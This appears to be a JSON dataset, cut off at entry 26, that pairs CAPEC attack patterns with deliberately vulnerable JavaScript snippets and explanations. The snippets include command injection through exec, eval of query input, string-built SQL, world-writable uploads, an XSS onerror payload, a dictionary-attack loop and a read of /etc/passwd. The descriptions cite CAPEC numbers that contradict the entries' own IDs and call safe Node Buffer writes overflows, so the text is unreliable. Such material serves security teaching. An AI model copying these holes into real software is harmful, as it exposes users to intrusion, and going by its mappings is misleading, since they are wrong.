[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  if (req.user) {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Route without proper ACL\napp.get('/admin', (req, res) => {\n  res.send('Welcome to the admin panel');\n});\n\n// Route with proper ACL\napp.get('/secure-admin', isAuthenticated, (req, res) => {\n  res.send('Welcome to the secure admin panel');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server. It demonstrates a route '/admin' that lacks proper Access Control List (ACL) enforcement, allowing any user to access it without authentication. This embodies the main idea of CAPEC-1220, where functionality is not properly constrained by ACLs. The '/secure-admin' route, on the other hand, uses a middleware function 'isAuthenticated' to check if the user is authenticated before granting access, representing a proper ACL implementation. The code highlights the vulnerability of incorrect default permissions (CWE-276) and improper authorization (CWE-285) by showing how an attacker could access sensitive functionality without proper checks."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "const users = { 'user1': { password: 'password123', attempts: 0, locked: false } }; \n\nfunction login(username, password) { \n  if (users[username].locked) { \n    console.log('Account is locked.'); \n    return; \n  } \n  if (users[username].password === password) { \n    console.log('Login successful!'); \n    users[username].attempts = 0; \n  } else { \n    users[username].attempts += 1; \n    if (users[username].attempts >= 3) { \n      users[username].locked = true; \n      console.log('Account locked due to too many failed attempts.'); \n    } else { \n      console.log('Incorrect password.'); \n    } \n  } \n} \n\n// Simulating an attack \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'wrongpassword'); \nlogin('user1', 'password123');",
        "description": "This JavaScript code snippet demonstrates a simple login mechanism with an account lockout feature. The 'users' object stores user data, including password, login attempts, and lockout status. The 'login' function checks if the account is locked, verifies the password, and increments the login attempts counter. If the number of failed attempts reaches 3, the account is locked. This code embodies the CAPEC idea of 'Inducing Account Lockout' by showing how an attacker can lock out a legitimate user by repeatedly entering incorrect passwords. The related CWEs are represented by the overly restrictive lockout mechanism (CWE-645) and the lack of measures to prevent excessive authentication attempts (CWE-307)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "function validateInput(input) {\n  // Early validation before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(input)) {\n    throw new Error('Invalid input');\n  }\n  // Canonicalize input by stripping leading ghost characters\n  input = input.replace(/^\\u200B+/, ''); // Zero-width space as ghost character\n  // Further processing of input\n  return input;\n}\n\ntry {\n  let userInput = '\\u200B\\u200Badmin'; // Ghost characters leading the input\n  let validatedInput = validateInput(userInput);\n  console.log('Validated Input:', validatedInput);\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before canonicalization, allowing an attacker to bypass input filters using leading 'ghost' characters. The `validateInput` function first checks if the input contains only alphanumeric characters. However, it does this before removing any leading zero-width space characters (used here as ghost characters). As a result, an input like '\\u200B\\u200Badmin' (with leading zero-width spaces) can bypass the initial validation check and be processed further, potentially leading to security issues. This example embodies the CAPEC concept of using ghost characters to bypass input filters and highlights related CWEs such as improper input validation and incorrect behavior order."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "const http = require('http');\n\nconst allowedIPs = ['192.168.1.1', '192.168.1.2'];\n\nhttp.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  if (allowedIPs.includes(clientIP)) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Access granted');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that grants or denies access based on the client's IP address. The server checks if the client's IP address is in the list of allowed IPs. If the IP address matches, access is granted; otherwise, access is denied. This code is vulnerable to the 'Using Alternative IP Address Encodings' attack (CAPEC-272) because it relies on a specific format of IP addresses for access control. An attacker could use alternative encodings of the IP address to bypass this check. Additionally, this code demonstrates CWE-291 (Reliance on IP Address for Authentication) and CWE-173 (Improper Handling of Alternate Encoding) by not validating the IP address against different possible encodings."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (data.toString().startsWith('SUPERVISOR_TONE')) {\n      // CWE-285: Improper Authorization\n      console.log('Supervisor command received, rerouting call...');\n      // Reroute or usurp command of the line\n      socket.write('Call rerouted');\n    } else {\n      console.log('Regular user command received');\n      socket.write('Command received');\n    }\n  });\n\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n  socket.on('end', () => {\n    console.log('Connection ended');\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\nconsole.log('Server listening on port 1337');",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code demonstrates a vulnerability similar to the Blue Boxing attack by not properly verifying the source of a communication channel (CWE-940) and failing to enforce strong authorization (CWE-285). When a message starting with 'SUPERVISOR_TONE' is received, it is treated as a supervisor command, allowing unauthorized rerouting of calls. Additionally, the code does not ensure message integrity during transmission (CWE-924), making it susceptible to tampering."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "const http = require('http');\nconst { exec } = require('child_process');\n\nhttp.createServer((req, res) => {\n  const userInput = req.url.split('?')[1];\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Server Error');\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(stdout);\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. When a request is received, it extracts user input from the URL query string and uses it as an argument in an OS command (`ls`). This code is vulnerable to OS Command Injection (CWE-78) because it does not properly neutralize special elements in the user input, allowing an attacker to inject arbitrary commands. This embodies the main idea of CAPEC-88 (Argument Injection), where an attacker can change the behavior of the application by injecting data or command syntax through non-validated and non-filtered arguments."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = '${userId}'`;\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.send('An error occurred');\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that is vulnerable to Blind SQL Injection. The application connects to a MySQL database and retrieves user information based on a user-provided ID. The user input is directly included in the SQL query without proper sanitization or validation, making it susceptible to SQL Injection attacks. The error messages are suppressed, but an attacker can still exploit the vulnerability by crafting input that affects the SQL query's execution. This example embodies the main idea of CAPEC-111 (Blind SQL Injection) and highlights related CWEs such as CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-20 (Improper Input Validation), and CWE-707 (Improper Neutralization)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "const vulnerableLibrary = require('vulnerable-library');\n\nfunction processData(input) {\n    let buffer = Buffer.alloc(10); // Allocate a buffer of size 10\n    buffer.write(input); // Write input to buffer without checking size\n    return buffer.toString();\n}\n\n// Example usage\nlet userInput = 'A'.repeat(20); // User input that exceeds buffer size\nconsole.log(processData(userInput));",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability in an API call. The `processData` function allocates a buffer of fixed size (10 bytes) and writes user input to this buffer without checking the size of the input. If the input exceeds the buffer size, it leads to a buffer overflow. This example embodies the main idea of CAPEC-1000, 'Buffer Overflow in an API Call', and highlights CWE-120 ('Buffer Copy without Checking Size of Input') and CWE-119 ('Improper Restriction of Operations within the Bounds of a Memory Buffer'). The code is vulnerable because it does not validate the size of the input before writing it to the buffer, which can lead to memory corruption and potential exploitation."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand(userInput) {\n  const buffer = Buffer.alloc(10);\n  buffer.write(userInput, 'utf8');\n\n  exec(buffer.toString(), (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage\nrunCommand('ls -la');",
        "description": "This JavaScript code snippet demonstrates a vulnerable command-line utility that can be exploited for a buffer overflow attack. The function `runCommand` takes user input, writes it to a buffer of fixed size (10 bytes), and then executes it as a shell command using `exec`. This code is vulnerable to CWE-120 (Buffer Copy without Checking Size of Input) because it does not validate the size of the user input before writing it to the buffer, leading to a potential buffer overflow. Additionally, it is susceptible to CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component) because it directly uses user input in a shell command without proper sanitization, which could lead to command injection. This snippet embodies the main idea of CAPEC-100 (Buffer Overflow in Local Command-Line Utilities) by showing how an adversary could exploit such vulnerabilities to execute arbitrary commands, potentially escalating privileges."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction runCommand() {\n  const envVar = process.env.USER_INPUT;\n  const buffer = Buffer.alloc(50);\n  buffer.write(envVar, 'utf-8');\n  exec(buffer.toString(), (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\nrunCommand();",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability via environment variables. The function `runCommand` reads an environment variable `USER_INPUT` and writes it to a buffer of fixed size (50 bytes) without checking the length of the input. This can lead to a buffer overflow if the environment variable exceeds the buffer size. The buffer content is then executed as a command using `exec`, which can lead to arbitrary code execution. This snippet embodies the main idea of CAPEC-14 (Buffer Overflow via Environment Variables) and highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  let filePath = path.join(__dirname, 'public', req.url);\n  let extname = path.extname(filePath);\n  let contentType = 'text/html';\n\n  switch (extname) {\n    case '.js':\n      contentType = 'text/javascript';\n      break;\n    case '.css':\n      contentType = 'text/css';\n      break;\n    case '.json':\n      contentType = 'application/json';\n      break;\n    case '.png':\n      contentType = 'image/png';\n      break;\n    case '.jpg':\n      contentType = 'image/jpg';\n      break;\n    case '.wav':\n      contentType = 'audio/wav';\n      break;\n  }\n\n  fs.readFile(filePath, (error, content) => {\n    if (error) {\n      if (error.code == 'ENOENT') {\n        fs.readFile('./404.html', (error, content) => {\n          res.writeHead(200, { 'Content-Type': 'text/html' });\n          res.end(content, 'utf-8');\n        });\n      } else {\n        res.writeHead(500);\n        res.end('Server Error: ' + error.code + ' ..\\n');\n      }\n    } else {\n      res.writeHead(200, { 'Content-Type': contentType });\n      res.end(content, 'utf-8');\n    }\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the 'public' directory and serves them based on their file extension. The code determines the content type by examining the file extension, which can lead to vulnerabilities if an attacker uploads a file with a misleading extension. For example, a file with a '.jpg' extension could contain malicious JavaScript code, and if the server misclassifies it, it could execute the code. This snippet embodies the CAPEC idea of exploiting a web server's decision-making based on filename or file extension, potentially leading to resource exhaustion, unintended actions, or exposure of sensitive data."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "const multicastChannel = new MulticastChannel();\n\n// Function to send a message to a specific client\nfunction sendMessage(clientId, message) {\n  const messageId = `client-${clientId}`;\n  const payload = JSON.stringify({ id: messageId, data: message });\n  multicastChannel.send(payload);\n}\n\n// Function to receive and process messages\nfunction receiveMessage(payload) {\n  const message = JSON.parse(payload);\n  const clientId = message.id.split('-')[1];\n\n  // Missing authentication for critical function\n  if (clientId === 'admin') {\n    // Process admin message\n    console.log('Admin message received:', message.data);\n  } else {\n    // Process regular client message\n    console.log('Client message received:', message.data);\n  }\n}\n\n// Simulate receiving a message intended for another client\nconst interceptedPayload = JSON.stringify({ id: 'client-admin', data: 'Sensitive data' });\nreceiveMessage(interceptedPayload);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can intercept and manipulate messages intended for another client by choosing the message identifier. The `sendMessage` function sends a message to a specific client using a multicast channel, embedding the client ID in the message. The `receiveMessage` function processes incoming messages but lacks proper authentication, allowing an attacker to impersonate an admin by crafting a message with the 'admin' identifier. This can lead to unauthorized access to sensitive information and critical functions. The code embodies the CAPEC idea of choosing message identifiers to gain unauthorized access, and it highlights related CWEs such as missing authentication for critical functions and improper enforcement of message integrity."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Vulnerable function that reads a file based on an environment variable\nfunction readConfigFile() {\n  const configFilePath = process.env.CONFIG_PATH;\n  if (!configFilePath) {\n    throw new Error('CONFIG_PATH environment variable is not set');\n  }\n\n  // CWE-73: External Control of File Name or Path\n  const resolvedPath = path.resolve(configFilePath);\n\n  // CWE-20: Improper Input Validation\n  if (!fs.existsSync(resolvedPath)) {\n    throw new Error('Config file does not exist');\n  }\n\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const configFileContent = fs.readFileSync(resolvedPath, 'utf8');\n  console.log('Config File Content:', configFileContent);\n}\n\n// Simulate setting an environment variable\nprocess.env.CONFIG_PATH = '/etc/passwd';\n\n// Call the vulnerable function\nreadConfigFile();",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an environment variable (CONFIG_PATH) is used to control the file path for reading a configuration file. The code does not properly validate the input, allowing an attacker to set the CONFIG_PATH to a sensitive file like '/etc/passwd'. This can lead to exposure of sensitive information (CWE-200) and external control of file paths (CWE-73). The function readConfigFile reads the file specified by the CONFIG_PATH environment variable without proper validation, embodying the main idea of CAPEC-15: Subverting Environment Variable Values."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  let input = req.url.substring(1); // Extract input from URL\n  let buffer = Buffer.alloc(10); // Allocate a buffer of size 10\n  buffer.write(input); // Write input to buffer without size check\n  res.end('Data received');\n});\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code sets up a simple HTTP server that listens for incoming requests. The server extracts input from the URL and writes it to a buffer without checking the size of the input. This can lead to a buffer overflow if the input exceeds the buffer size. The code demonstrates a 'Client-side Injection-induced Buffer Overflow' by allowing an attacker to inject malicious content through the URL, exploiting the buffer overflow vulnerability. The related CWEs are represented as follows: CWE-120 (Buffer Copy without Checking Size of Input), CWE-20 (Improper Input Validation), and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction executeCommand(userInput) {\n  // Vulnerable to command injection due to improper neutralization of special elements\n  const command = `ls ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand('&& echo vulnerable');",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and concatenates it directly into an OS command (`ls ${userInput}`) without proper neutralization of special elements. This allows an attacker to inject additional commands using delimiters like `&&`. For example, passing '&& echo vulnerable' as input will execute the `ls` command followed by `echo vulnerable`, demonstrating how an attacker can exploit this vulnerability to execute arbitrary commands. This snippet embodies the main idea of CAPEC-88 (Command Delimiters) and highlights related CWEs such as CWE-77 (Command Injection) and CWE-78 (OS Command Injection)."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'qwerty', 'user3': 'letmein' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Access granted';\n  } else {\n    return 'Access denied';\n  }\n}\n\n// CWE-307: No restriction on excessive authentication attempts\nfunction dictionaryAttack(username, dictionary) {\n  for (let i = 0; i < dictionary.length; i++) {\n    if (authenticate(username, dictionary[i]) === 'Access granted') {\n      console.log(`Password found: ${dictionary[i]}`);\n      return;\n    }\n  }\n  console.log('Password not found');\n}\n\nconst dictionary = ['123456', 'password', '123456789', 'password123', 'qwerty', 'abc123', 'letmein'];\ndictionaryAttack('user1', dictionary);",
        "description": "This JavaScript code snippet demonstrates a dictionary-based password attack (CAPEC-16) by attempting to authenticate a user with a list of common passwords. The 'users' object contains weak passwords (CWE-521). The 'authenticate' function checks if the provided username and password match any entry in the 'users' object. The 'dictionaryAttack' function iterates through a list of common passwords (dictionary) and tries to authenticate the user with each password. If a match is found, it logs the found password. This code lacks measures to prevent excessive authentication attempts (CWE-307), making it vulnerable to dictionary attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = __dirname + '/uploads/' + uploadedFile.name;\n\n  // Incorrect Permission Assignment for Critical Resource (CWE-732)\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n\n    // Improper Authorization (CWE-285)\n    if (uploadedFile.mimetype !== 'application/octet-stream') {\n      return res.status(403).send('File type not allowed.');\n    }\n\n    // Least Privilege Violation (CWE-272)\n    fs.chmod(uploadPath, 0o777, (err) => { // Overly permissive permissions\n      if (err) return res.status(500).send(err);\n      res.send('File uploaded and permissions set!');\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple file upload service. The code demonstrates several security weaknesses as described in the CAPEC and related CWEs:\n\n1. **Incorrect Permission Assignment for Critical Resource (CWE-732)**: The uploaded file is saved with overly permissive permissions (0o777), allowing any user to read, write, or execute the file.\n\n2. **Improper Authorization (CWE-285)**: The code attempts to check the file type but does so after the file has already been uploaded, which is not an effective authorization check.\n\n3. **Least Privilege Violation (CWE-272)**: The code sets the file permissions to 0o777, which is a violation of the principle of least privilege, as it grants excessive permissions to the file.\n\nThis code snippet embodies the main idea of the CAPEC by demonstrating how a system's configuration can be exploited to upload and execute malicious files, especially when proper security measures are not in place."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "<html>\n<body>\n  <img src=\"x\" onerror=\"alert('XSS Attack!')\">\n  <!-- < !-CDATA-<script>alert('XSS in CDATA')</script> -->\n</body>\n</html>",
        "description": "This HTML snippet demonstrates an XSS attack targeting non-script elements. The <img> tag includes an 'onerror' attribute that executes JavaScript when the image fails to load, which is a common XSS vector (CWE-82). Additionally, a commented-out CDATA section contains a script tag, illustrating how XSS can be embedded in unexpected places like XML comments (CWE-80). This code highlights the importance of proper input and output validation to prevent XSS attacks (CWE-79, CWE-692, CWE-81)."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  if (queryObject.script) {\n    try {\n      eval(queryObject.script); // CWE-284, CWE-79, CWE-506\n    } catch (e) {\n      res.writeHead(500, {'Content-Type': 'text/plain'});\n      res.end('Error executing script');\n      return;\n    }\n  }\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Script executed');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It parses the URL query parameters and checks if a 'script' parameter is present. If so, it attempts to execute the script using the 'eval' function. This embodies the CAPEC 'Embedding Scripts within Scripts' by allowing an adversary to embed and execute their own script within the server's context. The use of 'eval' here is particularly dangerous and represents CWE-284 (Improper Access Control), CWE-79 (Cross-site Scripting), and CWE-506 (Embedded Malicious Code). The server does not properly restrict access to the 'eval' function, does not neutralize user input, and allows the execution of potentially malicious code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "const crypto = require('crypto');\n\nconst algorithm = 'aes-128-cbc';\nconst key = '1234567890123456'; // CWE-321: Hard-coded cryptographic key\nconst iv = Buffer.alloc(16, 0); // CWE-1204: Weak IV generation\n\nconst encrypt = (text) => {\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n};\n\nconst decrypt = (encrypted) => {\n  const decipher = crypto.createDecipheriv(algorithm, key, iv);\n  let decrypted = decipher.update(encrypted, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n};\n\nconst plaintext = 'Sensitive data';\nconst ciphertext = encrypt(plaintext);\nconsole.log('Encrypted:', ciphertext);\nconsole.log('Decrypted:', decrypt(ciphertext));",
        "description": "This JavaScript code snippet demonstrates a vulnerable encryption implementation. It uses the AES-128-CBC algorithm with a hard-coded cryptographic key (CWE-321) and a weak initialization vector (IV) (CWE-1204). The encryption and decryption functions are defined using these insecure parameters. The code encrypts a plaintext message and then decrypts it, printing both the encrypted and decrypted messages. This example embodies the main idea of CAPEC-116 (Encryption Brute Forcing) by illustrating how weak encryption practices can make it easier for an attacker to perform a brute force attack to recover the plaintext."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const userId = req.query.userId;\n  // CWE-642: Storing critical state data in a cookie\n  res.cookie('sessionId', userId, { httpOnly: true, secure: false }); // CWE-539: Persistent cookie with sensitive information\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (!sessionId) {\n    return res.status(401).send('Unauthorized');\n  }\n  // CWE-346: No proper origin validation\n  res.send(`Welcome user ${sessionId}`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that is vulnerable to the 'Exploitation of Trusted Identifiers' attack pattern. The code includes several related weaknesses:\n\n1. **CWE-642 (External Control of Critical State Data)**: The application stores the session ID in a cookie, which can be accessed and manipulated by an attacker.\n2. **CWE-539 (Use of Persistent Cookies Containing Sensitive Information)**: The session ID is stored in a persistent cookie without proper security attributes.\n3. **CWE-346 (Origin Validation Error)**: The application does not properly validate the origin of the session ID, allowing an attacker to use a guessed or stolen session ID to gain unauthorized access.\n\nThe `/login` endpoint sets a session ID in a cookie based on the `userId` query parameter, and the `/dashboard` endpoint retrieves the session ID from the cookie to authenticate the user. This setup is vulnerable to session fixation and other attacks that exploit trusted identifiers."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Vulnerable authentication mechanism\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // Improper authentication: no validation of credentials\n  if (username === 'admin') {\n    // Exposure of sensitive information\n    res.send('Welcome admin! Here is the sensitive data: [Sensitive Data]');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Server running on port ${port}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable server-side authentication mechanism using Express.js. The '/login' endpoint accepts a username and password but fails to properly validate the credentials (CWE-287: Improper Authentication). If the username is 'admin', it grants access without checking the password, leading to an authentication bypass (CWE-290: Authentication Bypass by Spoofing). Additionally, it exposes sensitive information to unauthorized users (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). This code embodies the main idea of CAPEC-Trust in Client by exploiting the server's implicit trust in the client without proper validation."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.file;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n\n    // CWE-20: Improper Input Validation\n    if (path.extname(uploadedFile.name) !== '.txt') {\n      return res.status(400).send('Only .txt files are allowed.');\n    }\n\n    // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n    fs.readFile(uploadPath, 'utf8', (err, data) => {\n      if (err) return res.status(500).send(err);\n\n      // CWE-506: Embedded Malicious Code\n      if (data.includes('<script>')) {\n        return res.status(400).send('File contains malicious content.');\n      }\n\n      res.send('File uploaded and validated successfully.');\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple file upload server. The server allows users to upload files, but it contains several vulnerabilities that align with the CAPEC description and related CWEs. The code does not properly validate the file type (CWE-434), relies on the file extension to determine the file type (CWE-646), and does not adequately check the file content for malicious code (CWE-506). Additionally, it demonstrates improper input validation (CWE-20) by not thoroughly checking the uploaded file's properties. This example highlights how an adversary could exploit these weaknesses to inject malicious content into the system."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "function processInput(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i < input.length; i++) {\n    buffer[i] = input[i];\n  }\n  // Simulate a filter that fails to handle oversized input\n  if (buffer.includes('<script>')) {\n    console.log('Malicious input detected!');\n  } else {\n    console.log('Input processed: ' + buffer.join(''));\n  }\n}\n\n// Example of an oversized input causing buffer overflow\nvar maliciousInput = 'A'.repeat(20) + '<script>alert(\"XSS\")</script>';\nprocessInput(maliciousInput);",
        "description": "This JavaScript code snippet demonstrates a filter failure through buffer overflow. The `processInput` function takes an input string and attempts to copy it into a fixed-size buffer of 10 elements. If the input exceeds the buffer size, it causes a buffer overflow, potentially allowing malicious input to bypass the filter. The filter checks for the presence of the '<script>' tag to detect malicious input, but due to the buffer overflow, it may fail to do so securely. This example embodies the main idea of CAPEC-128, highlighting vulnerabilities such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "const lockA = { locked: false };\nconst lockB = { locked: false };\n\nfunction acquireLock(lock) {\n  return new Promise((resolve) => {\n    (function waitForLock() {\n      if (!lock.locked) {\n        lock.locked = true;\n        resolve();\n      } else {\n        setTimeout(waitForLock, 1);\n      }\n    })();\n  });\n}\n\nfunction releaseLock(lock) {\n  lock.locked = false;\n}\n\nasync function task1() {\n  await acquireLock(lockA);\n  console.log('Task 1 acquired lockA');\n  await new Promise(resolve => setTimeout(resolve, 100)); // Simulate work\n  await acquireLock(lockB);\n  console.log('Task 1 acquired lockB');\n  releaseLock(lockB);\n  releaseLock(lockA);\n}\n\nasync function task2() {\n  await acquireLock(lockB);\n  console.log('Task 2 acquired lockB');\n  await new Promise(resolve => setTimeout(resolve, 100)); // Simulate work\n  await acquireLock(lockA);\n  console.log('Task 2 acquired lockA');\n  releaseLock(lockA);\n  releaseLock(lockB);\n}\n\ntask1();\ntask2();",
        "description": "This JavaScript code snippet demonstrates a forced deadlock scenario. Two tasks, `task1` and `task2`, attempt to acquire two locks, `lockA` and `lockB`, in different orders. `task1` acquires `lockA` first and then tries to acquire `lockB`, while `task2` acquires `lockB` first and then tries to acquire `lockA`. This can lead to a deadlock where `task1` is waiting for `lockB` to be released by `task2`, and `task2` is waiting for `lockA` to be released by `task1`. The code uses promises to simulate the acquisition and release of locks, and the `setTimeout` function to simulate work being done while holding the locks. This example embodies the main idea of the CAPEC by illustrating how improper synchronization and locking can lead to a deadlock condition, causing a denial of service."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
